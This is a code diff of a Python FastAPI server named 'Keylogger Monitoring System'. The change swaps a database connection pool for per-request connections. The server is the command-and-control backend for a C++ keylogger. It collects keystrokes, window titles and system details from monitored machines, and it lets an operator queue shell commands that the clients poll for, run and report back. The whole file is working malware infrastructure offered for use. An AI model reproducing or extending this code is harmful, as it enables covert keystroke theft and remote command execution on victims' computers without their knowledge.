@@ -1,6 +1,6 @@
 import os
 import logging
-from fastapi import FastAPI, Request, HTTPException, Form, Query, Path, Depends
+from fastapi import FastAPI, Request, HTTPException, Form, Query, Path
 from fastapi.responses import JSONResponse, PlainTextResponse, HTMLResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
@@ -8,10 +8,9 @@ from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from typing import List, Dict, Any, Optional
 import pymysql
-from datetime import datetime, timedelta, timezone
-import uuid
+from datetime import datetime, timedelta, timezone # Added timezone
+import uuid # To generate unique IDs if needed
 import dotenv
-import queue # For thread-safe connection pooling
 
 dotenv.load_dotenv()
 
@@ -25,22 +24,17 @@ DATABASE_PORT = int(os.getenv("DATABASE_PORT", 4000))
 DATABASE_USER = os.getenv("DATABASE_USER", "your_tidb_user")
 DATABASE_PASSWORD = os.getenv("DATABASE_PASSWORD", "your_tidb_password")
 DATABASE_DB = os.getenv("DATABASE_DB", "keylogger_db")
-TIDB_SSL_CERT_PATH = os.getenv("TIDB_SSL_CERT_PATH", "isrgrootx1.pem")
+TIDB_SSL_CERT_PATH = os.getenv("TIDB_SSL_CERT_PATH", "isrgrootx1.pem") # Path to your SSL cert
 
-# --- Database Connection Pool ---
-MAX_POOL_SIZE = 10
-DB_CONNECT_TIMEOUT = 10 # Seconds for establishing a new connection
-db_pool = queue.Queue(maxsize=MAX_POOL_SIZE)
-
-def _create_raw_db_connection():
-    """Helper function to create a single raw database connection."""
+def get_db_connection():
+    """Establishes a database connection."""
     try:
+        # Check if the SSL certificate file exists
         ssl_params = {}
         if os.path.exists(TIDB_SSL_CERT_PATH):
-            ssl_params = {"ca": TIDB_SSL_CERT_PATH}
-            logger.info(f"Using SSL cert for DB connection: {TIDB_SSL_CERT_PATH}")
+            ssl_params = {"ca": TIDB_SSL_CERT_PATH} # For PyMySQL with TiDB Cloud
         else:
-            logger.warning(f"SSL certificate not found at {TIDB_SSL_CERT_PATH}. Attempting DB connection without client CA verification.")
+            logger.warning(f"SSL certificate not found at {TIDB_SSL_CERT_PATH}. Connecting without SSL specific CA if possible.")
 
         conn = pymysql.connect(
             host=DATABASE_HOST,
@@ -49,163 +43,39 @@ def _create_raw_db_connection():
             password=DATABASE_PASSWORD,
             db=DATABASE_DB,
             ssl=ssl_params if ssl_params else None,
-            cursorclass=pymysql.cursors.DictCursor,
-            connect_timeout=DB_CONNECT_TIMEOUT, # Timeout for new connection attempt
-            read_timeout=30, # Optional: Timeout for read operations
-            write_timeout=30 # Optional: Timeout for write operations
+            cursorclass=pymysql.cursors.DictCursor
         )
-        logger.info(f"Successfully created new DB connection {id(conn)}.")
         return conn
     except pymysql.MySQLError as e:
-        logger.error(f"Failed to create new DB connection: {e}")
-        # Raising HTTPException here might be too aggressive if called during pool init.
-        # Let's return None and handle it in the caller for pool init.
-        return None
-    except Exception as e: # Catch any other potential errors
-        logger.error(f"An unexpected error occurred during raw DB connection creation: {e}")
-        return None
+        logger.error(f"Database connection failed: {e}")
+        raise HTTPException(status_code=500, detail=f"Database connection failed: {str(e)}")
+    except Exception as e:
+        logger.error(f"An unexpected error occurred during DB connection: {e}")
+        raise HTTPException(status_code=500, detail=f"Unexpected DB connection error: {str(e)}")
 
 # --- FastAPI App Setup ---
 app = FastAPI(title="Keylogger Monitoring System", version="1.0")
 
-@app.on_event("startup")
-async def startup_db_pool():
-    """Initialize the database connection pool on application startup."""
-    logger.info(f"Initializing database pool with max size {MAX_POOL_SIZE}...")
-    for _ in range(MAX_POOL_SIZE):
-        try:
-            conn = _create_raw_db_connection()
-            if conn:
-                db_pool.put_nowait(conn)
-                logger.info(f"Added connection {id(conn)} to pool. Pool size: {db_pool.qsize()}")
-            else:
-                logger.warning("Failed to create a connection during pool initialization.")
-        except queue.Full:
-            logger.warning("DB Pool is full during initialization (should not happen with nowait).")
-            break # Pool is full
-        except Exception as e:
-            logger.error(f"Error creating connection for pool: {e}")
-    logger.info(f"Database pool initialized. Current size: {db_pool.qsize()}")
-
-@app.on_event("shutdown")
-async def shutdown_db_pool():
-    """Close all database connections in the pool on application shutdown."""
-    logger.info("Closing database connections in pool...")
-    closed_count = 0
-    while not db_pool.empty():
-        try:
-            conn = db_pool.get_nowait()
-            conn.close()
-            closed_count += 1
-            logger.info(f"Closed connection {id(conn)} from pool.")
-        except queue.Empty:
-            break # Pool is empty
-        except Exception as e:
-            logger.error(f"Error closing connection from pool: {e}")
-    logger.info(f"Database pool shutdown complete. Closed {closed_count} connections.")
-
-
-async def get_db_connection_dependency(): # FastAPI Dependency
-    """
-    Gets a database connection from the pool.
-    If the pool is empty, creates a new temporary one.
-    Pings the connection to ensure liveness.
-    Yields the connection and ensures it's returned to the pool.
-    """
-    conn = None
-    created_new_for_request = False
-    try:
-        try:
-            conn = db_pool.get(timeout=0.5) # Wait briefly for a connection
-            logger.info(f"Retrieved connection {id(conn)} from pool. Pool size after get: {db_pool.qsize()}")
-        except queue.Empty:
-            logger.warning("DB Pool empty or timed out waiting. Creating a new temporary connection.")
-            conn = _create_raw_db_connection()
-            if conn:
-                created_new_for_request = True
-                logger.info(f"Created new temporary connection {id(conn)}.")
-            else: # Failed to create new connection
-                raise HTTPException(status_code=503, detail="Database service unavailable: Could not create new connection.")
-
-        if not conn: # Should be caught by the else above, but as a safeguard
-             raise HTTPException(status_code=503, detail="Database service unavailable: Failed to obtain connection.")
-
-        # Check if connection is open and ping to ensure liveness
-        if not conn.open:
-            logger.warning(f"Connection {id(conn)} from pool was found closed. Discarding and creating new.")
-            try: conn.close() # Ensure it's fully closed if it was just marked not open
-            except Exception: pass
-            conn = _create_raw_db_connection() # Create a fresh one
-            if not conn:
-                 raise HTTPException(status_code=503, detail="Database service unavailable: Failed to replace closed connection.")
-            created_new_for_request = True # This new connection is temporary for this request
-            logger.info(f"Replaced closed connection with new temporary connection {id(conn)}.")
-        else:
-            conn.ping(reconnect=True) # Ping to ensure it's alive, reconnect if server killed it
-            logger.info(f"Connection {id(conn)} ping successful.")
-
-        yield conn  # Provide the connection to the route
-
-    except pymysql.MySQLError as e:
-        logger.error(f"Database connection error during request: {e}")
-        # If an error occurs with a pooled connection, it might be bad. Close it.
-        if conn and not created_new_for_request: # Only close if it was from the pool
-            logger.warning(f"Closing potentially bad pooled connection {id(conn)} due to error.")
-            try:
-                conn.close()
-            except Exception as close_err:
-                logger.error(f"Error closing bad pooled connection {id(conn)}: {close_err}")
-            conn = None # Ensure it's not returned to pool
-        raise HTTPException(status_code=503, detail=f"Database operation failed: {str(e)}")
-    except Exception as e:
-        logger.error(f"Unexpected error in get_db_connection_dependency: {e}")
-        raise HTTPException(status_code=500, detail=f"Internal server error processing database request: {str(e)}")
-    finally:
-        if conn and conn.open:
-            if created_new_for_request: # If we created it just for this request and pool might be full
-                try:
-                    db_pool.put_nowait(conn) # Try to add to pool if there's space
-                    logger.info(f"Returned temporary connection {id(conn)} to pool. Pool size: {db_pool.qsize()}")
-                except queue.Full:
-                    logger.warning(f"DB Pool full. Closing temporary connection {id(conn)} instead of adding to pool.")
-                    try: conn.close()
-                    except Exception as e_close: logger.error(f"Error closing temporary connection {id(conn)}: {e_close}")
-            else: # It was from the pool, so return it
-                try:
-                    db_pool.put_nowait(conn)
-                    logger.info(f"Returned connection {id(conn)} to pool. Pool size after put: {db_pool.qsize()}")
-                except queue.Full: # Should ideally not happen if taken from pool unless pool size changed or logic error
-                    logger.error(f"DB Pool full when returning a pooled connection {id(conn)}. This is unexpected. Closing.")
-                    try: conn.close()
-                    except Exception as e_close: logger.error(f"Error closing pooled connection {id(conn)} on unexpected full pool: {e_close}")
-                except Exception as e_put: # Other errors putting back
-                    logger.error(f"Error returning connection {id(conn)} to pool: {e_put}. Closing it.")
-                    try: conn.close()
-                    except Exception as e_close: logger.error(f"Error closing connection {id(conn)} after pool put error: {e_close}")
-
-        elif conn: # If conn exists but is not open (e.g., ping failed and it was closed by ping or error handling)
-             logger.info(f"Connection {id(conn)} was not open at end of request, ensuring it's closed and not returned to pool.")
-             try: conn.close() 
-             except Exception: pass
-
-
-# Mount static files
+# Mount static files (CSS, JS, images for the dashboard)
 app.mount("/static", StaticFiles(directory="static"), name="static")
+
+# Setup templates directory for HTML files
 templates = Jinja2Templates(directory="templates")
 
-# CORS Middleware
+# Configure CORS
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"], allow_credentials=True,
-    allow_methods=["*"], allow_headers=["*"],
+    allow_origins=["*"], 
+    allow_credentials=True,
+    allow_methods=["*"], 
+    allow_headers=["*"], 
 )
 
-# --- Pydantic Models (unchanged from previous version) ---
+# --- Pydantic Models ---
 class MachineInfo(BaseModel):
     machine_id: str
     computer_name: Optional[str] = None
     os_version: Optional[str] = None
-    # ... (rest of the model)
     processor_arch: Optional[str] = None
     num_processors: Optional[int] = None
     total_ram_mb: Optional[int] = None
@@ -226,7 +96,7 @@ class SimpleMachineInfoForDashboard(BaseModel):
 class KeylogEntryResponse(BaseModel):
     log_id: str
     machine_id: str
-    client_timestamp: Optional[str] = None
+    client_timestamp: Optional[str] = None # MODIFIED: Made Optional
     server_timestamp: datetime
     window_title: str
     log_data: str
@@ -242,7 +112,7 @@ class CommandEntryResponse(BaseModel):
     output: Optional[str] = None
     error: Optional[str] = None
 
-class CommandCreateRequest(BaseModel): # Not directly used by form posts, but good for reference
+class CommandCreateRequest(BaseModel):
     machine_id: str
     command: str
 
@@ -251,20 +121,20 @@ class CommandCreateResponse(BaseModel):
     status: str
     message: Optional[str] = None
 
-# --- API Endpoints for C++ Logger (Modified to use DB Dependency) ---
+
+# --- API Endpoints for C++ Logger (largely unchanged) ---
 
 @app.post("/systeminfo", summary="Receive system information from C++ logger")
 async def receive_system_info(
     request: Request,
     machine_id: str = Form(...),
-    system_info: str = Form(...),
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency) # Use new dependency
+    system_info: str = Form(...)
 ):
     client_ip = request.client.host if request.client else "Unknown IP"
-    logger.info(f"Received system info from machine {machine_id} (IP: {client_ip}) using conn {id(conn)}")
+    logger.info(f"Received system info from machine {machine_id} (IP: {client_ip})")
+    conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same as before, just uses the provided 'conn')
             cursor.execute("SELECT machine_id, computer_name FROM machines WHERE machine_id = %s", (machine_id,))
             existing_machine = cursor.fetchone()
 
@@ -306,16 +176,12 @@ async def receive_system_info(
                 logger.info(f"Registered new machine: {machine_id}")
             conn.commit()
         return JSONResponse(content={"message": "System info received"}, status_code=200)
-    except pymysql.MySQLError as e: # More specific DB error handling
-        conn.rollback() # Rollback on DB error
-        logger.error(f"DB Error receiving system info for machine {machine_id}: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error processing system info (DB): {str(e)}")
-    except Exception as e: # General errors
-        # Check if conn has rollback, though for non-DB errors it might not be relevant unless mid-transaction
-        if hasattr(conn, 'rollback'): conn.rollback()
-        logger.error(f"General Error receiving system info for machine {machine_id}: {e}", exc_info=True)
+    except Exception as e:
+        conn.rollback()
+        logger.error(f"Error receiving system info for machine {machine_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error processing system info: {str(e)}")
-    # 'finally' block for closing connection is now handled by the dependency
+    finally:
+        conn.close()
 
 @app.post("/log", summary="Receive keylog data from C++ logger")
 async def receive_log_data(
@@ -323,14 +189,13 @@ async def receive_log_data(
     machine_id: str = Form(...),
     client_timestamp: str = Form(...), 
     window_title: str = Form(...),
-    log_data: str = Form(...),
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
+    log_data: str = Form(...)
 ):
     client_ip = request.client.host if request.client else "Unknown IP"
-    logger.info(f"Received log data from machine {machine_id} (IP: {client_ip}) using conn {id(conn)}")
+    logger.info(f"Received log data from machine {machine_id} (IP: {client_ip}) for window: {window_title}")
+    conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
             cursor.execute("SELECT machine_id FROM machines WHERE machine_id = %s", (machine_id,))
             if cursor.fetchone() is None:
                  cursor.execute(
@@ -353,26 +218,22 @@ async def receive_log_data(
             )
             conn.commit()
         return JSONResponse(content={"message": "Log received"}, status_code=200)
-    except pymysql.MySQLError as e:
-        conn.rollback()
-        logger.error(f"DB Error receiving log data for machine {machine_id}: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error processing log data (DB): {str(e)}")
     except Exception as e:
-        if hasattr(conn, 'rollback'): conn.rollback()
-        logger.error(f"General Error receiving log data for machine {machine_id}: {e}", exc_info=True)
+        conn.rollback()
+        logger.error(f"Error receiving log data for machine {machine_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error processing log data: {str(e)}")
+    finally:
+        conn.close()
 
 @app.post("/command/result", summary="Receive command execution result from C++ logger")
-async def receive_command_result(
-    request: Request,
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
-):
+async def receive_command_result(request: Request):
     client_ip = request.client.host if request.client else "Unknown IP"
-    logger.info(f"Received command result POST request from {client_ip} using conn {id(conn)}")
+    logger.info(f"Received command result POST request from {client_ip}")
+    conn = get_db_connection()
     command_id = "Unknown" 
     try:
         body = await request.body()
-        result_string = body.decode('utf-8') # Specify UTF-8
+        result_string = body.decode('utf-8')
         logger.info(f"Raw command result body: {result_string}")
 
         parts = result_string.split('|', 3)
@@ -381,15 +242,13 @@ async def receive_command_result(
             raise HTTPException(status_code=400, detail="Malformed command result string. Expected format: command_id|status|output|error")
 
         command_id = parts[0]
-        status_str = parts[1] # Renamed to avoid conflict with status variable
-        # Basic sanitization/validation for status_str
-        valid_statuses = ['completed', 'failed', 'executing']
-        if status_str not in valid_statuses:
-             logger.warning(f"Command {command_id}: Invalid status '{status_str}' in result. Defaulting to 'failed'.")
-             status_str = 'failed'
-        
+        status = parts[1]
         output = parts[2] if len(parts) > 2 else "" 
         error = parts[3] if len(parts) > 3 else ""   
+
+        if status not in ['completed', 'failed', 'executing']:
+             logger.warning(f"Command {command_id}: Invalid status '{status}' in result. Defaulting to 'failed'.")
+             status = 'failed' 
 
         with conn.cursor() as cursor:
             update_query = """
@@ -402,38 +261,36 @@ async def receive_command_result(
                 WHERE command_id = %s
             """
             current_ts = datetime.now()
-            cursor.execute(update_query, (status_str, current_ts, status_str, current_ts, output, error, command_id))
+            cursor.execute(update_query, (status, current_ts, status, current_ts, output, error, command_id))
 
             if cursor.rowcount == 0:
-                 conn.rollback() # Rollback if command_id not found before raising
+                 conn.rollback()
                  logger.warning(f"Command ID not found for result update: {command_id}")
                  return JSONResponse(content={"message": "Command ID not found, result not stored"}, status_code=404) 
 
             conn.commit()
-        logger.info(f"Received result for command {command_id} with status: {status_str}")
+        logger.info(f"Received result for command {command_id} with status: {status}")
         return JSONResponse(content={"message": "Command result received"}, status_code=200)
-    except HTTPException: # Re-raise HTTPExceptions directly
-         raise
-    except pymysql.MySQLError as e:
-        if conn.open: conn.rollback()
-        logger.error(f"DB Error receiving command result for command {command_id}: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error processing command result (DB): {str(e)}")
+    except HTTPException as e:
+         raise e
     except Exception as e:
-        if conn.open and hasattr(conn, 'rollback'): conn.rollback()
-        logger.error(f"General Error receiving command result for command {command_id}: {e}", exc_info=True)
+        if conn.open: 
+            conn.rollback()
+        logger.error(f"Error receiving command result for command {command_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error processing command result: {str(e)}")
-
+    finally:
+        if conn.open:
+            conn.close()
 
 @app.get("/commands/pending", summary="C++ logger polls for pending commands", response_class=PlainTextResponse)
 async def get_pending_commands_for_client(
-    id: str = Query(..., description="The machine_id of the client logger"),
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
+    id: str = Query(..., description="The machine_id of the client logger")
 ):
-    logger.info(f"Polling for pending commands for machine_id: {id} using conn {id(conn)}")
+    logger.info(f"Polling for pending commands for machine_id: {id}")
+    conn = get_db_connection()
     response_string = ""
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
             cursor.execute(
                 """
                 SELECT command_id, command
@@ -457,17 +314,16 @@ async def get_pending_commands_for_client(
                     cmd_id_clean = cmd['command_id'].replace('|', '').replace('\n', '')
                     cmd_str_clean = cmd['command'].replace('|', '').replace('\n', '')
                     response_string += f"{cmd_id_clean}|{cmd_str_clean}\n"
-        
+            else: 
+                pass 
+
         logger.info(f"Returning {len(pending_commands)} pending commands for machine {id}")
         return PlainTextResponse(content=response_string, status_code=200)
-    except pymysql.MySQLError as e:
-        # Do not rollback here as it's mostly a read operation, though we do an update.
-        # If update fails, client will just poll again.
-        logger.error(f"DB Error fetching pending commands for machine {id}: {e}", exc_info=True)
-        return PlainTextResponse(content="", status_code=500) # Client expects plain text
     except Exception as e:
-        logger.error(f"General Error fetching pending commands for machine {id}: {e}", exc_info=True)
-        return PlainTextResponse(content="", status_code=500)
+        logger.error(f"Error fetching pending commands for machine {id}: {e}", exc_info=True)
+        return PlainTextResponse(content="", status_code=500) 
+    finally:
+        conn.close()
 
 
 # --- Dashboard HTML Serving ---
@@ -475,15 +331,15 @@ async def get_pending_commands_for_client(
 async def serve_dashboard(request: Request):
     return templates.TemplateResponse("index.html", {"request": request})
 
-# --- Dashboard API Endpoints (Modified to use DB Dependency) ---
+# --- Dashboard API Endpoints ---
 
 @app.get("/dashboard/api/devices", response_model=List[SimpleMachineInfoForDashboard], summary="List all registered machines for the dashboard")
-async def dashboard_list_machines(conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)):
-    logger.info(f"Dashboard: Listing machines using conn {id(conn)}")
+async def dashboard_list_machines():
+    logger.info("Dashboard: Listing machines")
+    conn = get_db_connection()
     machine_list = []
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
             cursor.execute(
                 """
                 SELECT machine_id, computer_name, reported_ip, last_seen, os_version, total_ram_mb
@@ -498,11 +354,12 @@ async def dashboard_list_machines(conn: pymysql.connections.Connection = Depends
                 
                 if not isinstance(last_seen_dt, datetime):
                     logger.warning(f"Machine {machine_db['machine_id']} has invalid last_seen_dt type: {type(last_seen_dt)}. Value: {last_seen_dt}. Using epoch as fallback.")
-                    last_seen_dt = datetime.min.replace(tzinfo=timezone.utc) 
+                    last_seen_dt = datetime.min.replace(tzinfo=timezone.utc) # Fallback for type issues
                 elif last_seen_dt.tzinfo is None: 
                     last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)
                 
                 status = "offline" 
+                # This check is now safer as last_seen_dt is guaranteed to be a datetime object
                 current_aware_time = datetime.now(timezone.utc) 
                 if current_aware_time - last_seen_dt < timedelta(minutes=5):
                     status = "active"
@@ -524,23 +381,20 @@ async def dashboard_list_machines(conn: pymysql.connections.Connection = Depends
                     uptime="N/A" 
                 ))
         logger.info(f"Dashboard: Returning {len(machine_list)} machines")
-        return machine_list # Pydantic handles response model
-    except pymysql.MySQLError as e:
-        logger.error(f"Dashboard: DB Error listing machines: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error listing machines (DB): {str(e)}")
+        return machine_list
     except Exception as e:
-        logger.error(f"Dashboard: General Error listing machines: {e}", exc_info=True)
+        logger.error(f"Dashboard: Error listing machines: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error listing machines: {str(e)}")
+    finally:
+        conn.close()
 
 @app.get("/dashboard/api/devices/{machine_id}/details", summary="Get detailed system information for a machine")
-async def dashboard_get_machine_system_info(
-    machine_id: str = Path(..., description="ID of the machine"),
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
-):
-    logger.info(f"Dashboard: Fetching system info for machine {machine_id} using conn {id(conn)}")
+async def dashboard_get_machine_system_info(machine_id: str = Path(..., description="ID of the machine")):
+    logger.info(f"Dashboard: Fetching system info for machine {machine_id}")
+    conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
+            # Ensure your 'machines' table has 'system_info_blob' or remove it from the query
             cursor.execute(
                 """
                 SELECT machine_id, computer_name, os_version, processor_arch, num_processors,
@@ -555,9 +409,11 @@ async def dashboard_get_machine_system_info(
             if not sys_info_db:
                 raise HTTPException(status_code=404, detail="Machine not found")
 
+            # Construct formatted_sys_info carefully, checking for system_info_blob's existence
             system_info_blob_content = sys_info_db.get('system_info_blob', 'N/A')
-            if system_info_blob_content is None: 
+            if system_info_blob_content is None: # Explicitly check for None if column might be nullable
                 system_info_blob_content = 'N/A (No system info blob recorded)'
+
 
             formatted_sys_info = f"Computer Name: {sys_info_db.get('computer_name', 'N/A')}\n" \
                                  f"OS Version: {sys_info_db.get('os_version', 'N/A')}\n" \
@@ -568,11 +424,12 @@ async def dashboard_get_machine_system_info(
                                  f"First Seen: {sys_info_db['first_seen'].isoformat() if sys_info_db.get('first_seen') else 'N/A'}\n" \
                                  f"Last Seen: {sys_info_db['last_seen'].isoformat() if sys_info_db.get('last_seen') else 'N/A'}\n" \
                                  f"\n--- Full System Info Blob ---\n{system_info_blob_content}"
+
+
             response_data = {
                  "machine_id": sys_info_db['machine_id'],
                  "computer_name": sys_info_db.get('computer_name'),
                  "os_version": sys_info_db.get('os_version'),
-                 # ... (all other fields)
                  "processor_arch": sys_info_db.get('processor_arch'),
                  "num_processors": sys_info_db.get('num_processors'),
                  "total_ram_mb": sys_info_db.get('total_ram_mb'),
@@ -584,28 +441,28 @@ async def dashboard_get_machine_system_info(
             }
         return JSONResponse(content=response_data)
     except pymysql.err.OperationalError as db_op_err:
-        if 'system_info_blob' in str(db_op_err).lower(): # Check if this is the specific error
-            logger.error(f"Database schema error: 'system_info_blob' column missing. {db_op_err}", exc_info=True)
-            raise HTTPException(status_code=500, detail="DB schema error: 'system_info_blob' column missing.")
-        else: # Other operational errors
-            logger.error(f"Dashboard: DB op error for machine {machine_id}: {db_op_err}", exc_info=True)
-            raise HTTPException(status_code=500, detail=f"DB operational error: {str(db_op_err)}")
-    except HTTPException:
-         raise 
+        # Specifically catch unknown column error for system_info_blob
+        if 'system_info_blob' in str(db_op_err).lower():
+            logger.error(f"Database schema error: 'system_info_blob' column missing in 'machines' table. {db_op_err}", exc_info=True)
+            raise HTTPException(status_code=500, detail="Database schema error: 'system_info_blob' column is missing. Please update the 'machines' table.")
+        else:
+            logger.error(f"Dashboard: Database operational error for machine {machine_id}: {db_op_err}", exc_info=True)
+            raise HTTPException(status_code=500, detail=f"Database operational error: {str(db_op_err)}")
+    except HTTPException as e:
+         raise e
     except Exception as e:
-        logger.error(f"Dashboard: General Error fetching system info for machine {machine_id}: {e}", exc_info=True)
+        logger.error(f"Dashboard: Error fetching system info for machine {machine_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error fetching system info: {str(e)}")
+    finally:
+        conn.close()
 
 @app.get("/dashboard/api/devices/{machine_id}/keylogs", response_model=List[KeylogEntryResponse], summary="Get keylogs for a specific machine")
-async def dashboard_get_machine_logs(
-    machine_id: str = Path(..., description="ID of the machine"),
-    limit: int = Query(1000, ge=1, le=5000),
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
-):
-    logger.info(f"Dashboard: Fetching logs for machine {machine_id}, limit {limit} using conn {id(conn)}")
+async def dashboard_get_machine_logs(machine_id: str = Path(..., description="ID of the machine"),
+                                     limit: int = Query(1000, ge=1, le=5000)): 
+    logger.info(f"Dashboard: Fetching logs for machine {machine_id}, limit {limit}")
+    conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
             cursor.execute(
                 """
                 SELECT log_id, machine_id, client_timestamp_str as client_timestamp,
@@ -618,33 +475,32 @@ async def dashboard_get_machine_logs(
                 (machine_id, limit)
             )
             logs_data = cursor.fetchall()
+            # Ensure client_timestamp is a string, even if None from DB, Pydantic Optional[str] will handle it
             for log_entry in logs_data:
                 if log_entry['client_timestamp'] is None:
-                    log_entry['client_timestamp'] = "" 
+                    log_entry['client_timestamp'] = "" # Or keep as None if model allows and JS handles
+
         logger.info(f"Dashboard: Returning {len(logs_data)} logs for machine {machine_id}")
         return logs_data 
-    except pymysql.MySQLError as e:
-        logger.error(f"Dashboard: DB Error fetching logs for machine {machine_id}: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error fetching logs (DB): {str(e)}")
     except Exception as e:
-        logger.error(f"Dashboard: General Error fetching logs for machine {machine_id}: {e}", exc_info=True)
+        logger.error(f"Dashboard: Error fetching logs for machine {machine_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error fetching logs: {str(e)}")
-
+    finally:
+        conn.close()
 
 @app.post("/dashboard/api/devices/{machine_id}/command", response_model=CommandCreateResponse, summary="Send a command to a specific machine via dashboard")
 async def dashboard_create_command(
     machine_id: str = Path(..., description="ID of the machine to command"),
-    command_payload: Dict[str, str] = None, # Expecting JSON payload e.g. {"command": "the_command"}
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
+    command_payload: Dict[str, str] = None 
 ):
-    if command_payload is None or "command" not in command_payload: # Check payload from JS
+    if command_payload is None or "command" not in command_payload:
         raise HTTPException(status_code=400, detail="Command payload is missing or malformed. Expected {'command': 'your_command'}.")
     
     command_str = command_payload["command"]
-    logger.info(f"Dashboard: Received command '{command_str}' for machine {machine_id} using conn {id(conn)}")
+    logger.info(f"Dashboard: Received command '{command_str}' for machine {machine_id}")
+    conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
             cursor.execute("SELECT machine_id FROM machines WHERE machine_id = %s", (machine_id,))
             if cursor.fetchone() is None:
                  raise HTTPException(status_code=404, detail="Machine not found")
@@ -660,28 +516,23 @@ async def dashboard_create_command(
             conn.commit()
         logger.info(f"Dashboard: Created pending command {command_id} for machine {machine_id}")
         return CommandCreateResponse(command_id=command_id, status="pending", message="Command sent to client for execution.")
-    except HTTPException:
-        if conn.open: conn.rollback() # Rollback if HTTP exception occurred after potential DB changes
-        raise
-    except pymysql.MySQLError as e:
-        if conn.open: conn.rollback()
-        logger.error(f"Dashboard: DB Error creating command for {machine_id}: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error creating command (DB): {str(e)}")
+    except HTTPException as e:
+        conn.rollback()
+        raise e
     except Exception as e:
-        if conn.open and hasattr(conn, 'rollback'): conn.rollback()
-        logger.error(f"Dashboard: General Error creating command for {machine_id}: {e}", exc_info=True)
+        conn.rollback()
+        logger.error(f"Dashboard: Error creating command for {machine_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error creating command: {str(e)}")
+    finally:
+        conn.close()
 
 @app.get("/dashboard/api/devices/{machine_id}/commands", response_model=List[CommandEntryResponse], summary="Get command history for a machine")
-async def dashboard_get_machine_commands(
-    machine_id: str = Path(..., description="ID of the machine"),
-    limit: int = Query(100, ge=1, le=1000),
-    conn: pymysql.connections.Connection = Depends(get_db_connection_dependency)
-):
-    logger.info(f"Dashboard: Fetching command history for machine {machine_id}, limit {limit} using conn {id(conn)}")
+async def dashboard_get_machine_commands(machine_id: str = Path(..., description="ID of the machine"),
+                                         limit: int = Query(100, ge=1, le=1000)):
+    logger.info(f"Dashboard: Fetching command history for machine {machine_id}, limit {limit}")
+    conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            # ... (rest of the logic is the same)
             cursor.execute(
                 """
                 SELECT command_id, machine_id, command, status, sent_timestamp,
@@ -696,17 +547,15 @@ async def dashboard_get_machine_commands(
             commands_data = cursor.fetchall()
         logger.info(f"Dashboard: Returning {len(commands_data)} command history entries for {machine_id}")
         return commands_data
-    except pymysql.MySQLError as e:
-        logger.error(f"Dashboard: DB Error fetching commands for {machine_id}: {e}", exc_info=True)
-        raise HTTPException(status_code=500, detail=f"Error fetching commands (DB): {str(e)}")
     except Exception as e:
-        logger.error(f"Dashboard: General Error fetching commands for {machine_id}: {e}", exc_info=True)
+        logger.error(f"Dashboard: Error fetching commands for {machine_id}: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Error fetching commands: {str(e)}")
+    finally:
+        conn.close()
 
 
 @app.get("/dashboard/api/devices/{machine_id}/screenshot", summary="Placeholder for machine screenshot")
 async def dashboard_get_machine_screenshot(machine_id: str = Path(..., description="ID of the machine")):
-    # This endpoint does not require DB access currently
     logger.info(f"Dashboard: Screenshot requested for machine {machine_id} (placeholder)")
     return JSONResponse(content={
         "timestamp": datetime.now().isoformat(),
@@ -717,5 +566,5 @@ async def dashboard_get_machine_screenshot(machine_id: str = Path(..., descripti
 
 if __name__ == "__main__":
     import uvicorn
-    logger.info("Starting Uvicorn server for Keylogger Monitoring System with DB Pool")
-    uvicorn.run(app="main:app", host="0.0.0.0", port=8000)
+    logger.info("Starting Uvicorn server for Keylogger Monitoring System")
+    uvicorn.run(app="app:app", host="0.0.0.0", port=8000, reload=True)
